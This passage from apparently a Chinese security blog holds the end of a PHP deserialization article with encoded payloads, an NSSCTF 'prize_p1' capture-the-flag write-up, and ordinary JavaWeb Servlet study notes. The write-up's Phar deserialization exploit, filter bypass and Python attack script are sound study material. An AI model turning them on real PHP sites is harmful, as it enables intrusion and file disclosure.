urlencode(serialize($b));\n\n得到payload\na%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A8%3A%22filename%22%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BN%3B%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7Di%3A1%3BN%3B%7D\n\n接下来解码一下\na:2:&#123;i:0;O:3:\"one\":2:&#123;s:9:\"year_parm\";a:1:&#123;i:0;s:10:\"Happy_func\";&#125;s:6:\"object\";O:6:\"second\":1:&#123;s:8:\"filename\";O:3:\"one\":2:&#123;s:9:\"year_parm\";a:1:&#123;i:0;s:10:\"Happy_func\";&#125;s:6:\"object\";O:5:\"third\":1:&#123;s:13:\"thirdstring\";a:1:&#123;s:6:\"string\";a:2:&#123;i:0;O:3:\"one\":2:&#123;s:9:\"year_parm\";a:1:&#123;i:0;s:10:\"Happy_func\";&#125;s:6:\"object\";N;&#125;i:1;s:6:\"MeMeMe\";&#125;&#125;&#125;&#125;&#125;&#125;i:1;N;&#125;\n\n修改i:1为i:0再进行URL编码，得到最终payload\na%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A8%3A%22filename%22%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BN%3B%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7Di%3A0%3BN%3B%7D\n\n\n[NSSCTF]prize_p1题目环境https://www.ctfer.vip/problem/14源码如下\n&lt;META http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n&lt;?php\nhighlight_file(__FILE__);\nclass getflag &#123;\n    function __destruct() &#123;\n        echo getenv(\"FLAG\");\n    &#125;\n&#125;\n\nclass A &#123;\n    public $config;\n    function __destruct() &#123;\n        if ($this->config == 'w') &#123;\n            $data = $_POST[0];\n            if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) &#123;\n                die(\"我知道你想干吗，我的建议是不要那样做。\");\n            &#125;\n            file_put_contents(\"./tmp/a.txt\", $data);\n        &#125; else if ($this->config == 'r') &#123;\n            $data = $_POST[0];\n            if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) &#123;\n                die(\"我知道你想干吗，我的建议是不要那样做。\");\n            &#125;\n            echo file_get_contents($data);\n        &#125;\n    &#125;\n&#125;\nif (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $_GET[0])) &#123;\n    die(\"我知道你想干吗，我的建议是不要那样做。\");\n&#125;\nunserialize($_GET[0]);\nthrow new Error(\"那么就从这里开始起航吧\");\n\n\n看到file_put_contents，file_get_contents以及魔术方法__destruct，想到这里可以利用Phar反序列化，我们写个文件然后用phar伪协议包含这个文件就可以触发魔术方法，接下来说一下几个需要绕过的点\n1、过滤了部分关键词，可以看到flag等关键词被绕过\n2、Phar文件含有很多不可见字符，怎么用file_put_contents函数来完整的上传\n3、throw new Error的绕过，即绕过抛出异常\n\n对于第一点，我们这里需要知道一个知识，就是当Phar文件进行gzip压缩后，是不影响其功能的，所以我们这里可以通过对文件进行gzip压缩来绕过，第二点，当我们使用Python脚本来上传文件时，就可以完整的上传文件，第三点，这算的上是一个老生常谈的问题了，反序列化写数组而后给另一个赋值为0从而绕过。\n思路有了，接下来开始解题，首先构造Phar文件\n&lt;?php\nclass getflag&#123;\n\n&#125;\n$a=new getflag();\n$b=array($a,0);\n$phar = new Phar(\"ph1.phar\"); //后缀名必须为phar\n$phar->startBuffering();\n$phar->setStub(\"&lt;?php __HALT_COMPILER(); ?>\"); //设置stub\n$phar->setMetadata($b); //将自定义的meta-data存入manifest\n$phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering();\n?>\n\n运行php文件后得到phar文件，打开文件修改i:1为i:0，然后再用脚本得到正确签名\nimport gzip \nfrom hashlib import sha1\nfile = open(\"ph1.phar\",\"rb\").read() \ntext = file[:-28] #读取开始到末尾除签名外内容 \nlast = file[-8:] #读取最后8位的GBMB和签名flag \nnew_file = text+sha1(text).digest() + last #生成新的文件内容，主要是此时sha1正确了。 \nopen(\"ph2.phar\",\"wb\").write(new_file)\n\n此时就得到了正确的phar文件，接下来构造写入文件的exp\n&lt;?php\nclass A &#123;\n    public $config='w';\n&#125;\n$a = new A();\necho serialize($a);\n?>\n\n得到写入文件的payload为O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;w&quot;;&#125;，同理得到读取文件的payload为O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;r&quot;;&#125;接下来有phar文件了，我们只需要对文件进行压缩来绕过关键词检测，再借用python脚本和写入文件的payload，就可以上传文件，同时再利用读取文件的payload就可以触发Phar反序列化，得到flag，最终脚本如下\nimport requests\nimport gzip\nimport re\n\nurl = 'http://1.14.71.254:28496/'\n\nfile = open(\"ph2.phar\", \"rb\") #打开文件\nfile_out = gzip.open(\"phar.zip\", \"wb+\")#创建压缩文件对象\nfile_out.writelines(file)\nfile_out.close()\nfile.close()\n\nrequests.post(\n    url,\n    params=&#123;\n        0: 'O:1:\"A\":1:&#123;s:6:\"config\";s:1:\"w\";&#125;'\n\n    &#125;,\n    data=&#123;\n        0: open('phar.zip', 'rb').read()\n    &#125;\n) # 写入\n\nres = requests.post(\n    url,\n    params=&#123;\n        0: 'O:1:\"A\":1:&#123;s:6:\"config\";s:1:\"r\";&#125;'\n    &#125;,\n    data=&#123;\n        0: 'phar://tmp/a.txt'\n    &#125;\n) # 触发\nres.encoding='utf-8'\nflag = re.compile('(NSSCTF\\&#123;.+?\\&#125;)').findall(res.text)[0]\nprint(flag)\n\n但我这里没有得到flag，看一些师傅说，这里的/tmp/a.txt无法写入内容，所以就不放flag截图了，思路应该是没什么问题的。\n参考文章https://xz.aliyun.com/t/10961#toc-1http://blog.m1kael.cn/index.php/archives/14/https://yangxikun.com/php/2013/08/24/php-garbage-collection-mechanism.html\n","slug":"浅析 PHP GC垃圾回收机制","date":"2022-11-15T13:20:20.000Z","categories_index":"WEB知识","tags_index":"PHP","author_index":"quan9i"},{"id":"1652a4b85d6c1ce935f814a6281e8e8f","title":"JAVAWeb 浅学笔记","content":"准备工作有IDEA，有Tomcat（去网上找一下tomcat官方网站，下载9版本的即可，10版本的可能因为与IDEA版本不适而发生各种报错），有Maven，Idea虽然自带有Maven，但其功能还是有些受限，最好还是去官网下载一下Maven到本地而后导入到IDEA中\nMavenMaven作用：导入多个jar包下载后配置如下然后应用即可，接下来新建项目新建完成后为这个样子新建没有webapp的参考这篇文章即可https://blog.csdn.net/weixin_43621277/article/details/126071792而后直接去配置一下tomcat，开启就可以看到helloworld了Maven项目简单配置完成。\nServlet作用：开发动态web技术(每个人请求得到内容不同)新建的话你右键创一个就好了，随便命名，我这里命名为test123接下来应该是有一个test123.iml的，他里面可以配置依赖包注：这里没有的话，在下面的终端处执行以下指令\nmvn idea:module \n如果报错没有这个指令，那么说明你没配置环境变量，自己去百度一下mvn的环境变量配置，然后重启idea再执行命令即可此时就去找对应servlet的依赖包链接如下https://mvnrepository.com/artifact/javax.servlet.jsp/javax.servlet.jsp-api/2.3.3放至下面如果冒红，刷新一下即可，而后就会自动安装接下来去修改父类的web.xml为最新版\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee\n                         http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\"\n         metadata-complete=\"true\">\n&lt;/web-app>\n然后此时去建子类，整一个maven项目\n即点击module新建一个maven项目，此时新建好的话需要添加两个文件夹分别是java和resources接下来让他继承servelt接口，新建包名最好起的比较易理解一点，如com.quan9i.servlet，接下来去继承Httpservlet，同时改写一下GET方法和POST方法\npublic class HelloServlet extends HttpServlet &#123;\n    \n    //由于get或者post只是请求实现的不同的方式，可以相互调用，业务逻辑都一样；\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        //ServletOutputStream outputStream = resp.getOutputStream();\n        PrintWriter writer = resp.getWriter(); //响应流\n        writer.print(\"Hello,Serlvet\");\n    &#125;\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        doGet(req, resp);\n    &#125;\n&#125;\n接下来就需要去访问了，但是在访问之前我们需要去写一下servlet的映射为什么需要映射：\n我们写的是JAVA程序，但是要通过浏览器访问，而浏览器需要连接web服务器，所以我们需\n要再web服务中注册我们写的Servlet，还需给他一个浏览器能够访问的路径；\n这个的话需要写在web.xml里，其内容更新后如下\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee\n                         http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\"\n         metadata-complete=\"true\">\n    &lt;!--注册Servlet-->\n    &lt;servlet>\n        &lt;servlet-name>hello&lt;/servlet-name>\n        &lt;servlet-class>com.quan9i.servlet.Helloservlet&lt;/servlet-class>\n    &lt;/servlet>\n    &lt;!--servlet的请求路径-->\n    &lt;servlet-mapping>\n        &lt;servlet-name>hello&lt;/servlet-name>\n        &lt;url-pattern>/hello&lt;/url-pattern>\n    &lt;/servlet-mapping>\n&lt;/web-app>\n接下来配置tomcat接下来直接运行即可成功访问到界面然后我们此时去访问hello路径，刚刚配置的web.xml中配置有这个，那么它就会调用对应的方法，我们在方法中重写了GET，此时就会对应那个重写的get方法，即输出Hello,Serlvet\nServlet原理简单的说，浏览器向Web容器请求Servlet，Web容器获取Servlet的响应，而我们可以控制的就是中间，即写Servlet，控制响应内容，还有就是这里的Web容器是Tomcat。图解如下\nMapping问题一个Servlet指定单个映射路径\n&lt;servlet-mapping>\n    &lt;servlet-name>hello&lt;/servlet-name>\n    &lt;url-pattern>/hello&lt;/url-pattern>\n&lt;/servlet-mapping>\n一个Servlet指定多个\n&lt;servlet-mapping>\n    &lt;servlet-name>hello&lt;/servlet-name>\n    &lt;url-pattern>/hello&lt;/url-pattern>\n&lt;/servlet-mapping>\n&lt;servlet-mapping>\n    &lt;servlet-name>hello&lt;/servlet-name>\n    &lt;url-pattern>/hello2&lt;/url-pattern>\n&lt;/servlet-mapping>\n&lt;servlet-mapping>\n    &lt;servlet-name>hello&lt;/servlet-name>\n    &lt;url-pattern>/hello3&lt;/url-pattern>\n&lt;/servlet-mapping>\n&lt;servlet-mapping>\n    &lt;servlet-name>hello&lt;/servlet-name>\n    &lt;url-pattern>/hello4&lt;/url-pattern>\n&lt;/servlet-mapping>\n&lt;servlet-mapping>\n    &lt;servlet-name>hello&lt;/servlet-name>\n    &lt;url-pattern>/hello5&lt;/url-pattern>\n&lt;/servlet-mapping>\n \n一个Servlet指定通用\n&lt;servlet-mapping>\n    &lt;servlet-name>hello&lt;/servlet-name>\n    &lt;url-pattern>/hello/*&lt;/url-pattern>\n&lt;/servlet-mapping>\n\n默认请求路径\n&lt;!--默认请求路径-->\n&lt;servlet-mapping>\n    &lt;servlet-name>hello&lt;/servlet-name>\n    &lt;url-pattern>/*&lt;/url-pattern>\n&lt;/servlet-mapping>\n指定后缀\n&lt;!--默认请求路径-->\n      &lt;servlet-mapping>\n          &lt;servlet-name>hello&lt;/servlet-name>\n          &lt;url-pattern>*.quan9i&lt;/url-pattern>  //注：此时前面是不能加通配符的\n      &lt;/servlet-mapping>\n优先级问题\n&lt;servlet-mapping>\n          &lt;servlet-name>hello&lt;/servlet-name>\n          &lt;url-pattern>/hello/*&lt;/url-pattern>\n&lt;/servlet-mapping>\n  &lt;!--404-->\n  &lt;servlet>\n      &lt;servlet-name>error&lt;/servlet-name>\n      &lt;servlet-class>com.kuang.servlet.ErrorServlet&lt;/servlet-class>\n  &lt;/servlet>\n  &lt;servlet-mapping>\n      &lt;servlet-name>error&lt;/servlet-name>\n      &lt;url-pattern>/*&lt;/url-pattern>\n  &lt;/servlet-mapping>\n  \n当同时存在通配符和固定映射路径时，固定映射路径优先级是高于通配符的\nServletContext共享数据# read.java\npublic class read extends HttpServlet &#123;\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException, IOException &#123;\n            ServletContext context = this.getServletContext();\n            String username = (String) context.getAttribute(\"username\");\n\n            resp.setContentType(\"text/html\");\n            resp.setCharacterEncoding(\"utf-8\");\n            resp.getWriter().print(\"名字\"+username);\n\n        &#125;\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n            doGet(req, resp);\n        &#125;\n&#125;\n\n\n#HelloServlet.java\npublic class HelloServlet extends HttpServlet &#123;\n\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        //this.getInitParameter()   初始化参数\n        //this.getServletConfig()   Servlet配置\n        //this.getServletContext()  Servlet上下文\n        ServletContext context = this.getServletContext();\n        String username = \"秦疆\"; //数据\n        context.setAttribute(\"username\",username); //将一个数据保存在了ServletContext中，名字为：username 。值 username\n    &#125;\n&#125;\n\n#web.xml\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee\n                         http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\"\n         metadata-complete=\"true\">\n    &lt;!--注册Servlet-->\n    &lt;!--注册Servlet-->\n    &lt;servlet>\n        &lt;servlet-name>hello&lt;/servlet-name>\n        &lt;servlet-class>com.quan9i.servlet.servlet.read&lt;/servlet-class>\n    &lt;/servlet>\n    &lt;!--servlet的请求路径-->\n    &lt;servlet-mapping>\n        &lt;servlet-name>hello&lt;/servlet-name>\n        &lt;url-pattern>/hello&lt;/url-pattern>\n    &lt;/servlet-mapping>\n\n\n    &lt;servlet>\n        &lt;servlet-name>write&lt;/servlet-name>\n        &lt;servlet-class>com.quan9i.servlet.servlet.HelloServlet&lt;/servlet-class>\n    &lt;/servlet>\n    &lt;!--servlet的请求路径-->\n    &lt;servlet-mapping>\n        &lt;servlet-name>write&lt;/servlet-name>\n        &lt;url-pattern>/write&lt;/url-pattern>\n    &lt;/servlet-mapping>\n&lt;/web-app>\n先访问write，写入值，得到结果为再去访问hello\n获取初始化参数可以写一些初始化参数在web.xml中，然后我们用这个方法去获取\n#web.xml\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee\n                         http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\"\n         metadata-complete=\"true\">\n    &lt;!--配置一些web应用初始化参数-->\n    &lt;context-param>\n        &lt;param-name>url&lt;/param-name>\n        &lt;param-value>jdbc:mysql://localhost:3306/mybatis&lt;/param-value>\n    &lt;/context-param>\n\n    &lt;!--注册Servlet-->\n    &lt;servlet>\n        &lt;servlet-name>hello&lt;/servlet-name>\n        &lt;servlet-class>com.quan9i.servlet.servlet.read&lt;/servlet-class>\n    &lt;/servlet>\n    &lt;!--servlet的请求路径-->\n    &lt;servlet-mapping>\n        &lt;servlet-name>hello&lt;/servlet-name>\n        &lt;url-pattern>/hello&lt;/url-pattern>\n    &lt;/servlet-mapping>\n&lt;/web-app>\n\n#read.java\npackage com.quan9i.servlet.servlet;\n\nimport javax.servlet.ServletContext;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class read extends HttpServlet &#123;\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        ServletContext context = this.getServletContext();\n        String url = context.getInitParameter(\"url\");\n        resp.getWriter().print(url);\n    &#125;\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        doGet(req, resp);\n    &#125;\n&#125;\n\n访问Hello\n请求转发getRequestDispatcher函数可以实现请求转发，即将某一路径下的内容在另一路径下同样可以请求到，与重定向是不同的\n# test.java\npublic class test extends HttpServlet &#123;\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        ServletContext context = this.getServletContext();\n        System.out.println(\"进入了test\");\n        //RequestDispatcher requestDispatcher = context.getRequestDispatcher(\"/gp\"); //转发的请求路径\n        //requestDispatcher.forward(req,resp); //调用forward实现请求转发；\n        context.getRequestDispatcher(\"/hello\").forward(req,resp);\n    &#125;\n\n&#125;\n\n# web.xml\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee\n                         http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\"\n         metadata-complete=\"true\">\n    &lt;!--配置一些web应用初始化参数-->\n    &lt;context-param>\n        &lt;param-name>url&lt;/param-name>\n        &lt;param-value>jdbc:mysql://localhost:3306/mybatis&lt;/param-value>\n    &lt;/context-param>\n\n    &lt;!--注册Servlet-->\n    &lt;servlet>\n        &lt;servlet-name>hello&lt;/servlet-name>\n        &lt;servlet-class>com.quan9i.servlet.servlet.read&lt;/servlet-class>\n    &lt;/servlet>\n    &lt;!--servlet的请求路径-->\n    &lt;servlet-mapping>\n        &lt;servlet-name>hello&lt;/servlet-name>\n        &lt;url-pattern>/hello&lt;/url-pattern>\n    &lt;/servlet-mapping>\n\n    &lt;servlet>\n        &lt;servlet-name>test&lt;/servlet-name>\n        &lt;servlet-class>com.quan9i.servlet.servlet.test&lt;/servlet-class>\n    &lt;/servlet>\n    &lt;!--servlet的请求路径-->\n    &lt;servlet-mapping>\n        &lt;servlet-name>test&lt;/servlet-name>\n        &lt;url-pattern>/test&lt;/url-pattern>\n    &lt;/servlet-mapping>\n&lt;/web-app>\n访问test请求转发与重定向图解如下\n读取资源文件在resources中新建配置文件db.properties，写入内容后启动tomcat，可以发现它的WEB路径是\nWEB-INF-classes-db.properties\n接下来就可以写一个java文件，读取文件内容，转换为字节流，然后再新建一个对象用反序列化读取内容，就可以获取到配置文件了\n#Servletdemo1.java\n\n   protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        InputStream is =this.getServletContext().getResourceAsStream(\"/WEB-INF/classes/aa.properties\");\n        Properties prep = new Properties();\n        prep.load(is);\n        String user = prep.getProperty(\"username\");\n        String pwd = prep.getProperty(\"password\");\n        resp.getWriter().print(user+\":\"+pwd);\n    &#125;\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        doGet(req, resp);\n    &#125;\n    \n#web.xml\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee\n                         http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\"\n         metadata-complete=\"true\">\n\n    &lt;!--注册Servlet-->\n    &lt;servlet>\n        &lt;servlet-name>sd1&lt;/servlet-name>\n        &lt;servlet-class>com.quan9i.servlet.servlet.Servletdemo1&lt;/servlet-class>\n    &lt;/servlet>\n    &lt;!--servlet的请求路径-->\n    &lt;servlet-mapping>\n        &lt;servlet-name>sd1&lt;/servlet-name>\n        &lt;url-pattern>/sd1&lt;/url-pattern>\n    &lt;/servlet-mapping>\n&lt;/web-app>\n\n而当在java那个文件夹下放置配置文件时，有时候会出现报错，这是因为约定大于配置然后新建的话build一下应该也是可以生成的，但是我这里没生成，就不访问了，以后再看这个。\nResponse下载文件过程实现分为以下几步\n1、要获取下载文件的路径\n2、下载的文件名是啥？\n3、设置想办法让浏览器能够支持下载我们需要的东西\n4、获取下载文件的输入流\n5、创建缓冲区\n6、获取OutputStream对象\n7、将FileOutputStream流写入到bufer缓冲区\n8、使用OutputStream将缓冲区中的数据输出到客户端！\n实现代码如下\n# servlet.java\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        // 1. 要获取下载文件的路径\n        String realPath = \"D:\\\\QQ\\\\保存的消息\\\\4.jpg\";\n        System.out.println(\"下载文件的路径：\"+realPath);\n        // 2. 下载的文件名是啥？\n        String fileName = realPath.substring(realPath.lastIndexOf(\"\\\\\") + 1);\n        // 3. 设置想办法让浏览器能够支持(Content-Disposition)下载我们需要的东西,中文文件名URLEncoder.encode编码，否则有可能乱码\n        resp.setHeader(\"Content-Disposition\",\"attachment;filename=\"+ URLEncoder.encode(fileName,\"UTF-8\"));\n        // 4. 获取下载文件的输入流\n        FileInputStream in = new FileInputStream(realPath);\n        // 5. 创建缓冲区\n        int len = 0;\n        byte[] buffer = new byte[1024];\n        // 6. 获取OutputStream对象\n        ServletOutputStream out = resp.getOutputStream();\n        // 7. 将FileOutputStream流写入到buffer缓冲区,使用OutputStream将缓冲区中的数据输出到客户端！\n        while ((len=in.read(buffer))>0)&#123;\n            out.write(buffer,0,len);\n        &#125;\n\n        in.close();\n        out.close();\n    &#125;\n\n#web.xml\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee\nhttp://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\"\n         metadata-complete=\"true\">\n    &lt;servlet>\n        &lt;servlet-name>down&lt;/servlet-name>\n        &lt;servlet-class>com.quan9i.servlet.servlet&lt;/servlet-class>\n    &lt;/servlet>\n    &lt;!--servlet的请求路径-->\n    &lt;servlet-mapping>\n        &lt;servlet-name>down&lt;/servlet-name>\n        &lt;url-pattern>/down&lt;/url-pattern>\n    &lt;/servlet-mapping>\n&lt;/web-app>\n接下来访问可能404，这是因为tomcat配置的没修改，我们需要去修改tomcat的Deployment为当前这个路径，然后再随便写一下根目录即可访问down，获取到下载文件\n验证码前端实现后端实现，需要用到Java的图片类，生产一个图片\n步骤分为以下几步\n1、设置图片，设置背景颜色\n2、设置字体颜色，设置随机数函数，将随机数函数画入图片\n3、清空缓存，设置每三秒刷新一次，设置字体\n代码实现\n#imageservlet.java\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        //让浏览器每3秒刷新一次\n        resp.setHeader(\"refresh\",\"3\");\n        //在内存中创建一个图片\n        BufferedImage bufferedImage = new BufferedImage(80,80,BufferedImage.TYPE_INT_RGB);\n        //得到图片\n        Graphics2D g =(Graphics2D) bufferedImage.getGraphics();\n        //设置图片背景颜色\n        g.setColor(Color.white);\n        //给图片写数据\n        g.fillRect(0,0,80,80);\n        g.setColor(Color.blue);\n        g.setFont(new Font(null,Font.BOLD,20));\n        g.drawString(makeNum(),0,20);\n\n        //告诉浏览器以图片形式打开\n        resp.setContentType(\"image/jpeg\");\n        //禁止浏览器缓存\n        resp.setDateHeader(\"expires\",-1);\n        resp.setHeader(\"Cache-Control\",\"no-Cache\");\n        resp.setHeader(\"Pragma\",\"no-Cache\");\n\n        //把图片写给浏览器\n        ImageIO.write(bufferedImage,\"jpeg\",resp.getOutputStream());\n    &#125;\n    //生成随机数\n    private String makeNum()&#123;\n        Random random = new Random();\n        String num = random.nextInt(999999)+\"\";\n        StringBuffer sb = new StringBuffer();\n        for (int i = 0; i&lt;7-num.length() ; i++)&#123;\n            sb.append(\"0\");\n        &#125;\n        num = sb.toString()+num;\n        return num;\n\n    &#125;\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        doGet(req, resp);\n    &#125;\n\n#web.xml\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee\nhttp://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\"\n         metadata-complete=\"true\">\n\n    &lt;servlet>\n        &lt;servlet-name>image&lt;/servlet-name>\n        &lt;servlet-class>com.quan9i.servlet.imageservlet&lt;/servlet-class>\n    &lt;/servlet>\n    &lt;!--servlet的请求路径-->\n    &lt;servlet-mapping>\n        &lt;servlet-name>image&lt;/servlet-name>\n        &lt;url-pattern>/img&lt;/url-pattern>\n    &lt;/servlet-mapping>\n&lt;/web-app>\n请求后就会发现每隔几秒刷新一次验证码了\n请求重定向请求重定向，即请求后重新定向到另一个路径下，具体实现代码如下。\n#sendservlet.java\npublic class sendservlet extends HttpServlet &#123;\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        resp.sendRedirect(\"/r/img\");\n    &#125;\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        doGet(req, resp);\n    &#125;\n&#125;\n\n#web.xml\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee\nhttp://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\"\n         metadata-complete=\"true\">\n\n    &lt;servlet>\n        &lt;servlet-name>image&lt;/servlet-name>\n        &lt;servlet-class>com.quan9i.servlet.imageservlet&lt;/servlet-class>\n    &lt;/servlet>\n    &lt;!--servlet的请求路径-->\n    &lt;servlet-mapping>\n        &lt;servlet-name>image&lt;/servlet-name>\n        &lt;url-pattern>/img&lt;/url-pattern>\n    &lt;/servlet-mapping>\n\n    &lt;servlet>\n        &lt;servlet-name>send&lt;/servlet-name>\n        &lt;servlet-class>com.quan9i.servlet.sendservlet&lt;/servlet-class>\n    &lt;/servlet>\n    &lt;!--servlet的请求路径-->\n    &lt;servlet-mapping>\n        &lt;servlet-name>send&lt;/servlet-name>\n        &lt;url-pattern>/send&lt;/url-pattern>\n    &lt;/servlet-mapping>\n&lt;/web-app>\n\n然后就是转发和重定向的区别\n1、请求转发url不变化，重定向url变化\n\n简单重定向，示例代码\n# index.jsp\n&lt;html>\n&lt;body>\n&lt;h2>Hel1o World!&lt;/h2>\n\n&lt;%--这里超交的路径,需要寻找到项目的路径--%>\n&lt;%--$&#123;pageContext. request, contextPath&#125;代表当前的项目--%>\n&lt;form action=\"$&#123;pageContext. request.contextPath&#125;/login\" method=\"get\">\n    用户名: &lt;input type=\"text\" name=\"username\"> &lt;br>\n    密码: &lt;input type=\"password\" name=\"password\"> &lt;br>\n    &lt;input type=\"submit\">\n&lt;/form>\n\n&lt;/body>\n&lt;/html>\n\n\n#request.java\npublic class request extends HttpServlet &#123;\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        //处理方求\n       System.out.println(\"成功进入\");\n    &#125;\n&#125;\n\n# web.xml\n&lt;?xml version=\"1.0\" 